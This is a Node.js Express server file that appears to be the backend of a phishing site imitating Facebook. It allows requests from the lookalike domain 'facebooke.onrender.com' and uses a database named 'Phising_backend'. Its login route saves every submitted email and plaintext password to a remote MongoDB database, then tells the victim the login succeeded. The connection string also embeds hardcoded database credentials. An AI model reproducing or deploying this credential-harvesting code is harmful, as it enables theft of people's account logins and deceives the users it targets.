const express=require("express")
const app=express();
const dotenv=require("dotenv").config();
const PORT=process.env.PORT || 8000
const usermodule=require("./loginmodel");
const mongoose=require("mongoose")
const cors=require("cors")
const path=require("path")

const dirname=path.resolve();

app.use(express.json());
app.use(cors({
    origin: "https://facebooke.onrender.com",
    methods: "GET,POST,PUT,DELETE,OPTIONS",
    allowedHeaders: "Content-Type,Authorization"
}));

mongoose.connect("mongodb+srv://hatersnothing@admin:harshid@aata@mycluser.7ontl.mongodb.net/Phising_backend", {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => console.log("MongoDB Connected Successfully"))
.catch(err => console.error("MongoDB Connection Error:", err));
app.options("*", cors()); 
app.post("/api/login",async(req,res)=>{
    const {password,email}=req.body;
    const data=await usermodule.create({
        email,
        password
    });
    res.status(200).json({message:"your login successfully done"});
})
app.use(express.static(path.join(dirname,"/Phising_web/dist")));
app.get('*',(_,res)=>{
    res.sendFile(path.join(dirname,"Phising_web","dist","index.html"));
})
app.listen(PORT,()=>{
    console.log(PORT);
    
    console.log("Your Port connecting successfully");
    
})